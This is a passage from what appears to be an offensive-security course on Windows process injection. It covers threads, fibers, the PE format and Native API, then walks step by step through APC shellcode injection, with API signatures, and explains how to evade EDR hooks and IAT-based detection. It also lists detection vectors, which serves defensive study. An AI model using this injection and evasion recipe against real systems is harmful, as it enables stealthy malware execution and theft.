(mutexes, events), UI elements (windows, menus), etc.</li>\n<li><strong>Threads:</strong> The actual units of execution. A process <em>must</em> have at least one thread (the primary thread), but can have many. Threads share the process&#39;s resources, <em>especially</em> the virtual address space.</li>\n</ul>\n<p><strong>User-Mode vs. Kernel-Mode Address Space</strong></p>\n<p>This is a critical distinction. The virtual address space is divided into two major regions:</p>\n<ul>\n<li><strong>User-Mode:</strong> This is where your application code runs. Access is restricted. If your code tries to access memory outside its allocated user-mode space (or memory it doesn&#39;t have permission for), you get an Access Violation (the dreaded crash!).</li>\n<li><strong>Kernel-Mode:</strong> This space is reserved for the Windows kernel, device drivers, and other core OS components. Kernel-mode code has full access to <em>all</em> memory and hardware. User-mode code <em>cannot</em> directly access kernel-mode memory or execute kernel-mode instructions. Communication happens via carefully controlled transitions (like system calls, which we&#39;ll touch on later).</li>\n</ul>\n<p>On 64-bit Windows, the split is typically 0x0000000000000000 to 0x00007FFFFFFFFFFF for user-mode and 0xFFFF800000000000 upwards for kernel-mode. The gap in between is deliberately unmapped.</p>\n<p><strong>Why is this important for us?</strong><br>When we perform injection, we are typically operating <em>within</em> the target process&#39;s user-mode address space. We need to find or create space there (<code>VirtualAllocEx</code>), write our code/data there (<code>WriteProcessMemory</code>), and then find a way to make a thread <em>in that target process</em> execute code <em>at the address where we wrote our payload</em>. Understanding the address space helps us visualize where our code lives and the boundaries we must respect (or find ways around).</p>\n<h3><strong>1.2 Threads: The Engines of Execution</strong></h3>\n<p>While the process is the container, threads are the actual workers. A thread is the smallest unit of execution that the Windows scheduler manages. Each thread has its own:</p>\n<ul>\n<li><strong>Execution Context:</strong> This includes the CPU&#39;s registers (Instruction Pointer/Program Counter - <code>RIP</code>/<code>EIP</code>, stack pointer - <code>RSP</code>/<code>ESP</code>, base pointer - <code>RBP</code>/<code>EBP</code>, general purpose registers, flags register, etc.). This context is saved and restored by the OS when switching between threads.</li>\n<li><strong>Stack:</strong> Each thread gets its own stack within the process&#39;s virtual address space. The stack is used for local variables, function parameters, and return addresses during function calls.</li>\n<li><strong>Thread Information Block (TIB):</strong> A per-thread data structure maintained by the OS (and accessible from user-mode) that stores thread-specific information. This includes:<ul>\n<li>Pointer to the thread&#39;s Stack Base and Stack Limit.</li>\n<li>Thread Local Storage (TLS) array/directory.</li>\n<li>Structured Exception Handling (SEH) frame list.</li>\n<li>A pointer to the Process Environment Block (PEB) (shared by all threads in the process).</li>\n<li>Other thread-specific flags and data.<br>The <code>FS</code> register on x86 and the <code>GS</code> register on x64 are typically used to point to the beginning of the TIB in user-mode, making it quickly accessible. This is a low-level detail often used in shellcode or highly optimized code, and a concept sometimes explored in texts like <code>zhasslan.txt</code> when discussing manual stack walking or accessing thread-local data.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Thread States and Scheduling</strong></p>\n<p>Threads transition through various states:</p>\n<ul>\n<li><strong>Running:</strong> Currently executing on a CPU core.</li>\n<li><strong>Ready:</strong> Waiting to be scheduled on a CPU core.</li>\n<li><strong>Waiting:</strong> Paused, waiting for some event to occur (e.g., waiting for I/O completion, waiting on a synchronization object, sleeping, or <em>waiting in an alertable state</em>).</li>\n<li><strong>Terminated:</strong> Finished execution.</li>\n</ul>\n<p>The OS scheduler decides which thread runs on which core and for how long (time slicing).</p>\n<p><strong>Why is this important for us?</strong><br>To execute our injected code, we need a thread in the target process to jump to our code&#39;s address.</p>\n<ul>\n<li>We could create a <em>new</em> thread (<code>CreateRemoteThread</code>, <code>NtCreateThreadEx</code>).</li>\n<li>We could hijack an <em>existing</em> thread. This is where understanding thread states and the TIB becomes critical. Can we redirect a thread that&#39;s currently waiting? Can we manipulate its context (<code>GetThreadContext</code>, <code>SetThreadContext</code>)? Yes, and we will explore these techniques.</li>\n</ul>\n<h3><strong>1.3 Fibers: Cooperative Execution Units</strong></h3>\n<p>Fibers are a different beast. They are <em>user-mode</em> constructs that allow an application to implement its own cooperative scheduling. Unlike threads, which are scheduled preemptively by the OS kernel, fibers are scheduled by the application itself using specific API calls (<code>SwitchToFiber</code>).</p>\n<p><strong>Fibers vs. Threads:</strong></p>\n<ul>\n<li><strong>Scheduling:</strong> OS (preemptive) for Threads, Application (cooperative) for Fibers.</li>\n<li><strong>Overhead:</strong> Creating a Fiber is generally lighter than creating a Thread. Switching <em>between</em> fibers within the <em>same thread</em> is also lighter than an OS thread context switch.</li>\n<li><strong>Stack:</strong> Multiple fibers can run <em>within a single thread</em>. They can potentially share the same stack, although typically each fiber is created with its own stack. This requires careful management by the application.</li>\n<li><strong>OS Visibility:</strong> The OS scheduler only sees the <em>thread</em> that the fiber is running on, not the fiber itself. Debuggers and monitoring tools often have less native support for enumerating or tracking fibers compared to threads.</li>\n</ul>\n<p><strong>Why are Fibers relevant?</strong><br>They represent another potential execution context within a process. If we can inject code and somehow get a fiber within a target thread to switch to our code, that&#39;s another path to execution. Their lower visibility to standard OS tools can sometimes make them an attractive, albeit less common, target or mechanism for injection (as we&#39;ll see in Module 4).</p>\n<h3><strong>1.4 The Portable Executable (PE) Format Revisited</strong></h3>\n<p>You&#39;ve likely encountered the PE format (.exe, .dll, .sys files) if you&#39;ve done any reverse engineering or binary analysis. It&#39;s the structure that defines how Windows executables are organized. For our purposes, we need to focus on a few key parts:</p>\n<ul>\n<li><strong>Headers:</strong> The initial structures (DOS Header, NT Headers) that provide crucial metadata about the file, including the location of other important structures.</li>\n<li><strong>Data Directories:</strong> An array within the Optional Header that points to various important tables, including the Import Address Table (IAT) and the Export Address Table (EAT).</li>\n<li><strong>Import Address Table (IAT):</strong> This table lists the functions that the executable imports from <em>other</em> DLLs. When the Windows loader loads a PE file, it finds the required DLLs, resolves the addresses of the imported functions, and patches the IAT entries to point directly to those functions in memory. Static analysis tools love to look at the IAT to see what API calls a program is likely to make.</li>\n<li><strong>Export Address Table (EAT):</strong> This table lists the functions that a DLL (or sometimes an EXE) <em>exports</em> for <em>other</em> modules to use. It contains the names (or ordinals) and the relative virtual addresses (RVAs) of the exported functions within the module. This table is <em>essential</em> for dynamic API resolution, which we&#39;ll cover in Module 6.</li>\n</ul>\n<p><strong>Why is this important for us?</strong></p>\n<ul>\n<li>Understanding the IAT shows us how static linking works and why it&#39;s a detection vector.</li>\n<li>Understanding the EAT is fundamental to implementing our <em>own</em> dynamic API resolution, allowing us to find function addresses at runtime without relying on the easily detectable IAT or standard <code>GetProcAddress</code>. This is straight out of the <code>zhasslan.txt</code> playbook ‚Äì avoid relying on standard library/loader features that can be monitored.</li>\n</ul>\n<h3><strong>1.5 User-Mode API Layers: WinAPI vs. Native API</strong></h3>\n<p>Windows provides multiple layers of APIs for user-mode applications to interact with the OS:</p>\n<ul>\n<li><strong>WinAPI:</strong> This is the high-level, well-documented API set (<code>kernel32.dll</code>, <code>user32.dll</code>, <code>gdi32.dll</code>, etc.). Functions like <code>CreateProcess</code>, <code>CreateWindow</code>, <code>WriteFile</code>, <code>VirtualAllocEx</code>, <code>CreateRemoteThread</code>. These are designed for application developers, are relatively stable across Windows versions, and handle a lot of complexity internally.</li>\n<li><strong>Native API:</strong> This is a lower-level API set exposed primarily by <code>ntdll.dll</code>. Functions typically start with <code>Nt</code> or <code>Zw</code> (e.g., <code>NtCreateProcessEx</code>, <code>NtAllocateVirtualMemory</code>, <code>NtCreateThreadEx</code>, <code>NtQueueApcThread</code>). These functions are often less documented, can be more sensitive to OS version changes, and provide a more direct interface to the kernel&#39;s system call dispatcher. WinAPI functions often act as wrappers around one or more Native API calls.</li>\n</ul>\n<pre><code class=\"language-mermaid\">graph LR\n    A[Your User Application] --&gt; B(WinAPI - kernel32.dll, etc.)\n    B --&gt; C(Native API - ntdll.dll)\n    A --&gt; C\n    C --&gt; D{Syscall Interface}\n    D --&gt; E[Windows Kernel]\n</code></pre>\n<p><strong>Why use Native API?</strong></p>\n<ul>\n<li><strong>Stealth:</strong> Calling Native API functions directly can bypass user-mode hooks placed by security products on common WinAPI functions.</li>\n<li><strong>Reduced Imports:</strong> By manually resolving and calling Native API functions, your executable&#39;s IAT might only show imports for <code>ntdll.dll</code> itself, and possibly only functions needed to <em>start</em> the resolution process (like <code>LdrGetProcedureAddress</code> or even lower-level PE parsing), making static analysis harder. This aligns with the <code>zhasslan.txt</code> philosophy of minimizing reliance on high-level, easily monitored components.</li>\n<li><strong>Access to Lower-Level Features:</strong> Some kernel features or options are only exposed via the Native API.</li>\n</ul>\n<p>We will dive much deeper into finding and using Native API calls in Module 3 and integrating them with dynamic resolution in Modules 6 and 7.</p>\n<h3><strong>1.6 Why Go Beyond Basic <code>CreateRemoteThread</code>/<code>WriteProcessMemory</code>?</strong></h3>\n<p>Okay, let&#39;s address the elephant in the room. The simplest, most widely known injection technique is:</p>\n<ol>\n<li><code>OpenProcess</code> on the target.</li>\n<li><code>VirtualAllocEx</code> in the target to allocate memory (often <code>PAGE_EXECUTE_READWRITE</code>).</li>\n<li><code>WriteProcessMemory</code> to copy your shellcode into the allocated memory.</li>\n<li><code>CreateRemoteThread</code> in the target, pointing the start address to your shellcode.</li>\n<li><code>CloseHandle</code>s.</li>\n</ol>\n<p>This works! And for a long time, it was sufficient. But modern security products (EDRs, AVs) <em>heavily</em> monitor these specific API calls, especially when used across processes.</p>\n<p><strong>Limitations and Detection Vectors of Simple Injection:</strong></p>\n<ul>\n<li><strong>API Monitoring:</strong> Security software hooks <code>OpenProcess</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>. They look for suspicious patterns:<ul>\n<li><code>OpenProcess</code> calls with high access rights (<code>PROCESS_ALL_ACCESS</code>) targeting common processes (<code>explorer.exe</code>, <code>lsass.exe</code>, browsers).</li>\n<li><code>VirtualAllocEx</code> allocating executable memory (<code>PAGE_EXECUTE*</code>) in another process.</li>\n<li><code>WriteProcessMemory</code> writing data <em>into</em> that newly allocated executable memory.</li>\n<li><code>CreateRemoteThread</code> being called where the <code>lpStartAddress</code> parameter points into memory allocated by <code>VirtualAllocEx</code> (not a standard loaded module).</li>\n</ul>\n</li>\n<li><strong>Memory Scanning:</strong> Security products can scan process memory for patterns indicative of injected shellcode (e.g., known shellcode bytes, highly suspicious byte sequences, executable memory regions not backed by a file on disk).</li>\n<li><strong>Thread Analysis:</strong> They can enumerate threads and look for threads whose start address is in memory not associated with a legitimate module, or threads whose call stack looks unusual.</li>\n<li><strong>IAT Analysis:</strong> The injector executable itself might have a suspicious IAT showing imports for <code>OpenProcess</code>, <code>VirtualAllocEx</code>, etc.</li>\n</ul>\n<p>Our goal in this course is to learn techniques that are harder to detect by avoiding these common patterns. We&#39;ll explore:</p>\n<ul>\n<li>Using different execution contexts (APCs, Fibers) instead of just creating a new thread.</li>\n<li>Using lower-level Native API calls instead of well-known WinAPI wrappers.</li>\n<li>Obscuring our API calls using dynamic resolution and hashing.</li>\n<li>Leveraging unconventional methods that security products might not explicitly monitor.</li>\n</ul>\n<p>This requires a deeper understanding of the underlying mechanisms, which is exactly what Module 1 is all about!</p>\n<h3><strong>1.7 Putting It Together</strong></h3>\n<p>So, to recap Module 1:</p>\n<ul>\n<li>A <strong>Process</strong> is an isolated container with its own <strong>Virtual Address Space</strong> (split into user and kernel modes) and resources.</li>\n<li><strong>Threads</strong> are the active units of execution within a process, each with its own context and stack, scheduled by the OS. Understanding <strong>Thread States</strong> and the <strong>TIB</strong> is key.</li>\n<li><strong>Fibers</strong> are user-mode, cooperatively scheduled execution units that live <em>within</em> a thread.</li>\n<li>The <strong>PE Format</strong> defines how executables are structured. The <strong>IAT</strong> is for imported functions (a static analysis target), and the <strong>EAT</strong> is for exported functions (our key for dynamic resolution).</li>\n<li>The <strong>Native API</strong> (<code>ntdll.dll</code>) provides a lower-level interface to the OS compared to the higher-level <strong>WinAPI</strong>, offering potential stealth benefits.</li>\n<li>Standard injection techniques relying on <code>CreateRemoteThread</code> and <code>WriteProcessMemory</code> are easily detected due to API monitoring and memory scanning. We need more advanced methods.</li>\n</ul>\n<p>This foundational knowledge is our starting point. Now, let&#39;s get hands-on!</p>\n<hr>\n<h3><strong>Module 1 Project/Exercise: Exploring Processes and Threads</strong></h3>\n<p>This exercise has two parts. Part 1 uses a debugger to explore a running process, and Part 2 involves writing a simple C++ tool.</p>\n<p><strong>Goal:</strong> Get comfortable observing process/thread details and writing basic code to interact with processes.</p>\n<p><strong>Environment Setup:</strong></p>\n<ul>\n<li>Make sure you have a debugger installed (WinDbg from the Windows SDK or x64dbg).</li>\n<li>Have your C/C++ environment ready.</li>\n<li><strong>Crucially:</strong> Do this inside your isolated Virtual Machine!</li>\n</ul>\n<h4><strong>Part 1: Debugger Analysis of <code>notepad.exe</code></strong></h4>\n<p>We&#39;ll use <code>notepad.exe</code> because it&#39;s simple, runs in user-mode, and is present on every Windows system.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><strong>Start <code>notepad.exe</code>:</strong> Just run it normally.</li>\n<li><strong>Find its Process ID (PID):</strong> Open Task Manager (Ctrl+Shift+Esc). Go to the &quot;Details&quot; tab. Find <code>notepad.exe</code> in the list and note its PID. Keep Task Manager open.</li>\n<li><strong>Attach your Debugger:</strong><ul>\n<li><strong>WinDbg:</strong> Open WinDbg. Go to <code>File -&gt; Attach to a Process...</code>. Find <code>notepad.exe</code> by name or PID. Select it and click &quot;Attach&quot;. WinDbg will likely break into the process immediately. Type <code>g</code> and press Enter to let it run (<code>g</code> stands for &quot;go&quot;). To break in again, press <code>Ctrl+Break</code>.</li>\n<li><strong>x64dbg:</strong> Open x64dbg (choose 32-bit or 64-bit version based on your OS/Notepad architecture, usually 64-bit on modern systems). Go to <code>File -&gt; Attach</code>. Find <code>notepad.exe</code> by name or PID. Select it and click &quot;Attach&quot;. x64dbg will break in. Click the &quot;Run&quot; button (or F9) to let it run. To pause, click the &quot;Pause&quot; button.</li>\n</ul>\n</li>\n<li><strong>Enumerate Threads and Observe States:</strong><ul>\n<li><strong>WinDbg:</strong> Break into the process (<code>Ctrl+Break</code>). Type <code>~</code> and press Enter. This lists all threads. The output will show thread IDs (e.g., <code>0</code>, <code>1</code>, <code>2</code>) and possibly an indicator like <code>.</code>. To see more detail, including the <em>state</em>, type <code>~* kb</code> and press Enter. This runs the <code>kb</code> (display stack backtrace) command for <em>all</em> threads (<code>~*</code>). Look at the output. Can you identify threads that are in a &quot;Wait&quot; state? What functions are they waiting in? (e.g., <code>WaitForSingleObject</code>, <code>MsgWaitForMultipleObjects</code>). Why might they be waiting? (Hint: Notepad is a GUI application, its threads wait for user input or messages).</li>\n<li><strong>x64dbg:</strong> Go to the &quot;Threads&quot; tab in the main window. You&#39;ll see a list of threads, their IDs, and their current state (e.g., Running, Waiting, Suspended). Observe the states. Select a Waiting thread and look at its Call Stack pane ‚Äì what functions are at the top of the stack?</li>\n</ul>\n</li>\n<li><strong>Identify Loaded Modules and Base Addresses:</strong><ul>\n<li><strong>WinDbg:</strong> Type <code>lm</code> and press Enter. This lists all loaded modules (<code>.exe</code> and <code>.dll</code> files). Find <code>notepad.exe</code>, <code>kernel32.dll</code>, <code>ntdll.dll</code>, <code>user32.dll</code>, etc. Note their base addresses (the starting memory address where they are loaded).</li>\n<li><strong>x64dbg:</strong> Go to the &quot;Memory Map&quot; tab. This shows all allocated memory regions, including mapped modules. Find the base addresses for <code>notepad.exe</code>, <code>kernel32.dll</code>, <code>ntdll.dll</code>, etc. You can also see loaded modules in the &quot;Modules&quot; tab, which lists base addresses.</li>\n</ul>\n</li>\n<li><strong>Examine a Module&#39;s PE Header (Focus on Export Directory):</strong><ul>\n<li>Choose either <code>kernel32.dll</code> or <code>ntdll.dll</code>. Get its base address from the previous step. Let&#39;s say <code>kernel32.dll</code> is loaded at <code>0x7FFxxxxxxxxx</code>.</li>\n<li>We need to find the PE header. The DOS header is always at the base address (<code>0x7FFxxxxxxxxx</code>). The DOS header contains a pointer (at offset <code>0x3C</code>) to the NT Headers. Let&#39;s find that pointer.<ul>\n<li><strong>WinDbg:</strong> Type <code>dd &lt;base_address&gt;+3c L1</code> (e.g., <code>dd 0x7FFxxxxxxxxx+3c L1</code>). This displays a double-word (4 bytes) or quad-word (8 bytes on 64-bit) at that offset. The value you see is the RVA (Relative Virtual Address) of the NT Headers <em>relative to the module&#39;s base</em>. Add this RVA to the base address to get the absolute address of the NT Headers.</li>\n<li><strong>x64dbg:</strong> Go to the &quot;Dump&quot; tab. Enter the base address of the DLL. Scroll or go to offset <code>+3C</code>. Read the 4 bytes there (it&#39;s a DWORD). This is the RVA of the NT Headers. Add it to the base address.</li>\n</ul>\n</li>\n<li>Now, go to the address of the NT Headers. The NT Headers structure contains the File Header and the Optional Header. The Optional Header is where the Data Directories are located. For a 64-bit PE, the Data Directories start at offset <code>0x88</code> from the start of the Optional Header. For a 32-bit PE, they start at offset <code>0x78</code>. The Export Directory is the <em>first</em> entry (index 0) in the Data Directory array.</li>\n<li>Let&#39;s find the address of the Export Directory entry in the Data Directory array. Go to the address of the NT Headers + File Header Size + Offset to Data Directories. (File Header size is 20 bytes for 64-bit, 24 for 32-bit).<ul>\n<li><strong>WinDbg:</strong> Type <code>dt _IMAGE_NT_HEADERS64 &lt;nt_headers_address&gt;</code>. This will display the structure. Find the <code>OptionalHeader.DataDirectory</code> array. The first entry is the Export Directory. Note its <code>VirtualAddress</code> (this is the RVA of the Export Directory Table itself) and <code>Size</code>.</li>\n<li><strong>x64dbg:</strong> Go to the Dump tab at the NT Headers address. Manually navigate to the Optional Header (NT Headers + 24 bytes for 32-bit, + 20 bytes for 64-bit). Then navigate to the Data Directories within the Optional Header (+0x78 for 32-bit, +0x88 for 64-bit). The first 8 bytes (4 for RVA, 4 for Size) are for the Export Directory. Note the RVA (the first 4 bytes).</li>\n</ul>\n</li>\n<li>Add the Export Directory RVA to the module&#39;s base address to get the absolute memory address of the Export Directory Table in the target process. This is the table we&#39;ll parse manually in Module 6!</li>\n<li><strong>Using a PE Viewer Tool (Recommended for beginners):</strong> Before doing this manually in the debugger, use a tool like PE-Bear or CFF Explorer to open <code>C:\\Windows\\System32\\kernel32.dll</code> (or <code>SysWOW64</code> for 32-bit). These tools parse the PE</li>\n</ul>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-2": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 2: module_2</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, welcome back! Module 1 laid the groundwork, giving us a crucial understanding of Windows processes, threads, and memory from a low-level perspective. We saw <em>why</em> understanding things like the PE format and Native API is essential, and we touched on the limitations of simple <code>CreateRemoteThread</code> injection ‚Äì it&#39;s often noisy and easily detectable.</p>\n<p>Now, we&#39;re going to build on that foundation and explore our first advanced execution technique: <strong>Asynchronous Procedure Calls (APCs)</strong>. This method allows us to queue a function (our shellcode) to be executed by an <em>existing</em> thread within a target process. It&#39;s a powerful technique that bypasses the need to create a <em>new</em> thread, which can sometimes be a detection vector.</p>\n<p>Let&#39;s dive deep into Module 2!</p>\n<hr>\n<h2>Module 2: Hijacking Execution - Asynchronous Procedure Calls (APCs)</h2>\n<ul>\n<li><strong>Module Objective:</strong> Learn how Asynchronous Procedure Calls (APCs) function and implement code to queue and trigger execution of arbitrary code within a target thread using APCs.</li>\n</ul>\n<h3>Introduction: Why APCs?</h3>\n<p>Imagine you&#39;re a thread busy doing its work. Suddenly, the operating system needs you to do something else urgently, but it doesn&#39;t want to force you to stop <em>immediately</em>. Instead, it leaves a message for you in your &quot;inbox.&quot; The next time you reach a natural pause point where you&#39;re waiting for something (like waiting for user input, a file operation to complete, or a timer to expire), you check your inbox, find the message, and execute the requested task before returning to what you were doing.</p>\n<p>This is the essence of a User-Mode APC. It&#39;s a mechanism to request that a specific thread execute a function <em>asynchronously</em> at a later time, specifically when that thread enters an &quot;alertable state.&quot; For us offensive folks, this means we can queue our malicious code (shellcode) to an existing thread in a target process.</p>\n<p>Compared to <code>CreateRemoteThread</code>, APC injection doesn&#39;t create a brand new thread entry in the target process&#39;s thread list (which defenders might monitor). It leverages the existing threads, making it potentially less conspicuous depending on the monitoring tools in place.</p>\n<h3>Essential Subtopics Deep Dive:</h3>\n<h4>1. What are APCs? User-Mode vs. Kernel-Mode APCs.</h4>\n<ul>\n<li><strong>APCs (Asynchronous Procedure Calls):</strong> A system mechanism that allows a function to be executed asynchronously within the context of a specific thread. Each thread maintains an APC queue.</li>\n<li><strong>User-Mode APCs:</strong> These are queued by user-mode code (like our injector) targeting a user-mode thread. The queued function will execute at <code>APC_LEVEL</code> (a specific IRQL, Interrupt Request Level, in the kernel, but we interact with it from user-mode). User-mode APCs are only dispatched when the target thread explicitly enters an <em>alertable state</em>. This is the type we will focus on in this module.</li>\n<li><strong>Kernel-Mode APCs:</strong> These are queued by the kernel (or kernel-mode drivers) targeting <em>any</em> thread. They are typically used for internal OS operations (like I/O completion). Kernel-mode APCs can interrupt a thread&#39;s execution at any time (when the kernel deems safe, usually at <code>APC_LEVEL</code> or above), not just when it&#39;s alertable. We generally cannot queue kernel-mode APCs directly from user mode without exploiting a vulnerability or using specific kernel drivers, so they are less relevant for standard user-mode injection techniques.</li>\n</ul>\n<h4>2. The APC Queue and How it&#39;s Processed by Threads.</h4>\n<ul>\n<li>Every thread object in the kernel has an associated APC queue.</li>\n<li>When a User-Mode APC is queued to a thread, the OS adds the APC request (including a pointer to the function to execute and optional parameters) to that thread&#39;s user-mode APC queue.</li>\n<li>The thread continues its normal execution until it enters an <em>alertable state</em>.</li>\n<li>When in an alertable state, the thread&#39;s dispatcher checks its user-mode APC queue.</li>\n<li>If there are queued APCs, the thread temporarily suspends its current execution context, switches to the context required by the APC function, executes the APC function, and then (upon the APC function&#39;s return) resumes its original execution context.</li>\n<li>The thread processes APCs from its queue one by one until the queue is empty, before returning from the alertable wait state.</li>\n</ul>\n<h4>3. The Concept of a Thread Being in an &quot;Alertable State&quot;.</h4>\n<p>This is the critical dependency for User-Mode APC injection. The target thread <em>must</em> call a function that puts it into an alertable wait state for the APC to be dispatched. Common WinAPI functions that do this include:</p>\n<ul>\n<li><code>SleepEx</code></li>\n<li><code>SignalObjectAndWait</code> (when the object is signaled <em>and</em> the wait is alertable)</li>\n<li><code>WaitForMultipleObjectsEx</code></li>\n<li><code>WaitForSingleObjectEx</code></li>\n<li><code>MsgWaitForMultipleObjectsEx</code></li>\n<li>Functions that involve waiting on I/O completion routines (IOCPs) using <code>FILE_FLAG_OVERLAPPED</code> and providing an APC function.</li>\n</ul>\n<p>Many GUI applications, service threads, or threads performing asynchronous I/O naturally enter alertable states. However, a thread that is constantly busy computing or running in a tight loop will <em>not</em> dispatch user-mode APCs queued to it until it eventually calls one of these alertable wait functions. This is a significant limitation and a potential detection vector (a thread that <em>should</em> be busy suddenly entering an alertable state might look suspicious).</p>\n<h4>4. Key API Functions for APCs: <code>NtQueueApcThread</code> (Native API) and <code>QueueUserAPC</code> (WinAPI).</h4>\n<ul>\n<li><p><strong><code>NtQueueApcThread</code> (Native API):</strong> This is the lower-level system call that the WinAPI function wraps.</p>\n<pre><code class=\"language-c++\">// NtQueueApcThread signature (simplified/common representation)\n// Actual signature requires understanding NTSTATUS and kernel structures\n// This is often accessed via function pointer from ntdll.dll\ntypedef NTSTATUS (NTAPI* pNtQueueApcThread)(\n    HANDLE ThreadHandle,\n    PKNORMAL_ROUTINE ApcRoutine, // Pointer to the function to execute\n    PVOID NormalContext,         // 1st parameter for ApcRoutine\n    PVOID SystemArgument1,       // 2nd parameter for ApcRoutine\n    PVOID SystemArgument2        // 3rd parameter for ApcRoutine\n);\n</code></pre>\n<p>Calling <code>NtQueueApcThread</code> directly (which we&#39;ll explore more in Module 3) avoids the <code>kernel32.dll</code> import and gives us direct access to the syscall. The <code>ApcRoutine</code> is the address of our code, and <code>NormalContext</code>, <code>SystemArgument1</code>, <code>SystemArgument2</code> are optional parameters passed to it.</p>\n</li>\n<li><p><strong><code>QueueUserAPC</code> (WinAPI):</strong> This is the standard WinAPI wrapper provided in <code>kernel32.dll</code>. It&#39;s simpler to use initially.</p>\n<pre><code class=\"language-c++\">DWORD WINAPI QueueUserAPC(\n  PAPCFUNC pfnAPC,       // Pointer to the APC function (our code)\n  HANDLE   hThread,      // Handle to the target thread\n  ULONG_PTR dwData       // Optional parameter passed to the APC function\n);\n</code></pre>\n<p>This function takes the address of the APC function (<code>pfnAPC</code>), a handle to the target thread (<code>hThread</code>), and a single <code>ULONG_PTR</code> data value (<code>dwData</code>) which is passed as the <em>first</em> parameter to <code>pfnAPC</code>. The <code>dwData</code> parameter is equivalent to <code>NormalContext</code> in <code>NtQueueApcThread</code>. The other two parameters (<code>SystemArgument1</code>, <code>SystemArgument2</code>) are typically set by the OS/wrapper.</p>\n<p>For shellcode execution, <code>pfnAPC</code> will be the address where we&#39;ve written our shellcode in the target process&#39;s memory. The shellcode needs to be designed to handle the single parameter passed to it (if <code>dwData</code> is used). Often, for simple payloads, <code>dwData</code> is set to 0, and the shellcode doesn&#39;t expect any parameters.</p>\n</li>\n</ul>\n<h4>5. Practical Implementation: Writing an Injector.</h4>\n<p>Here&#39;s the step-by-step process we&#39;ll follow to build our APC injector:</p>\n<ol>\n<li><p><strong>Get a Handle to the Target Process:</strong> We need <code>PROCESS_VM_OPERATION</code>, <code>PROCESS_VM_WRITE</code>, <code>PROCESS_VM_READ</code> (often included in <code>PROCESS_ALL_ACCESS</code> or a combination like <code>PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ</code>) and <code>PROCESS_QUERY_INFORMATION</code> to interact with the process.</p>\n<ul>\n<li>API: <code>OpenProcess</code>.</li>\n</ul>\n</li>\n<li><p><strong>Find a Suitable Thread in the Target Process:</strong> We need a handle to one or more threads within the target process. We can enumerate threads belonging to the target process.</p>\n<ul>\n<li>API: <code>CreateToolhelp32Snapshot</code> with <code>TH32CS_SNAPTHREAD</code>, <code>Thread32First</code>, <code>Thread32Next</code>. We&#39;ll iterate through the threads returned and check if their <code>th32OwnerProcessID</code> matches our target PID. We need <code>THREAD_SET_CONTEXT</code> (implicitly for <code>QueueUserAPC</code> to modify thread state) and <code>THREAD_QUERY_INFORMATION</code> permissions (often included in <code>THREAD_ALL_ACCESS</code>).</li>\n<li>API: <code>OpenThread</code>.</li>\n</ul>\n</li>\n<li><p><strong>Allocate Memory in the Target Process:</strong> We need a region of memory in the target process where we can write our shellcode. This memory needs execute permissions.</p>\n<ul>\n<li>API: <code>VirtualAllocEx</code>. We&#39;ll request <code>MEM_COMMIT | MEM_RESERVE</code> and <code>PAGE_EXECUTE_READWRITE</code> protection.</li>\n</ul>\n</li>\n<li><p><strong>Write the Shellcode into the Allocated Memory:</strong> Copy our shellcode byte array from our injector process into the allocated memory in the target process.</p>\n<ul>\n<li>API: <code>WriteProcessMemory</code>.</li>\n</ul>\n</li>\n<li><p><strong>Queue the APC to the Target Thread(s):</strong> Use <code>QueueUserAPC</code> to register our shellcode address as the APC function for the chosen thread(s).</p>\n<ul>\n<li>API: <code>QueueUserAPC</code>. The first parameter will be the address returned by <code>VirtualAllocEx</code>.</li>\n</ul>\n</li>\n<li><p><strong>Trigger the APC (Implicitly or Explicitly):</strong> The APC will execute when the target thread enters an alertable state. For simple cases targeting common processes (like <code>notepad.exe</code> when idle), this often happens naturally. For more robust injection, you might need to wait or even <em>force</em> a thread into an alertable state (e.g., suspending/resuming the thread, which is more complex and adds detection vectors). For this module, we&#39;ll rely on the thread naturally entering an alertable state, or suggest targeting processes known to do so.</p>\n</li>\n<li><p><strong>Clean Up:</strong> Close the handles we opened.</p>\n<ul>\n<li>API: <code>CloseHandle</code>.</li>\n</ul>\n</li>\n</ol>\n<h4>6. Limitations, Common Pitfalls, and Detection Considerations.</h4>\n<ul>\n<li><strong>Alertable State Dependency:</strong> As discussed, the biggest limitation is the reliance on the target thread entering an alertable state. If it doesn&#39;t, the APC will remain queued indefinitely.</li>\n<li><strong>Thread Selection:</strong> Choosing the &quot;right&quot; thread can be tricky. Some threads might be critical system threads where injecting could cause instability or crashes. Targeting a thread that is known to enter alertable states (like a GUI thread processing messages) is often preferred.</li>\n<li><strong>Shellcode Design:</strong> The shellcode needs to be position-independent (PIC) if you can&#39;t guarantee its load address (though <code>VirtualAllocEx</code> gives you the address). It also needs to be aware it&#39;s running as an APC ‚Äì it shouldn&#39;t do anything that prevents the original thread&#39;s context from being restored or causes the thread to exit prematurely, unless that&#39;s the intended effect (e.g., shellcode to terminate the process). Simple payloads like spawning <code>calc.exe</code> or showing a message box are usually fine.</li>\n<li><strong>Detection Vectors:</strong><ul>\n<li><strong>API Monitoring:</strong> Monitoring calls to <code>OpenProcess</code>, <code>OpenThread</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and especially <code>QueueUserAPC</code> (<code>NtQueueApcThread</code>). EDRs often hook these functions.</li>\n<li><strong>Memory Scanning:</strong> Detecting executable memory (<code>PAGE_EXECUTE_READWRITE</code>) in regions not backed by legitimate loaded modules (<code>.dll</code>s or the main <code>.exe</code>). This is a very common detection method.</li>\n<li><strong>Behavioral Analysis:</strong> A process suddenly spawning a new process (<code>calc.exe</code>) after an <code>QueueUserAPC</code> call is observed can be a strong indicator.</li>\n<li><strong>Thread State Analysis:</strong> Monitoring thread states. While APCs don&#39;t create <em>new</em> threads, a thread entering an alertable state <em>unexpectedly</em> might be suspicious, though harder to reliably detect.</li>\n</ul>\n</li>\n</ul>\n<h3>Module Project/Exercise: Building the APC Injector</h3>\n<p><strong>Goal:</strong> Create a C++ command-line tool that injects and executes a small shellcode payload into a target process using APCs.</p>\n<p><strong>Requirements:</strong></p>\n<ol>\n<li>Accept the target Process ID (PID) as 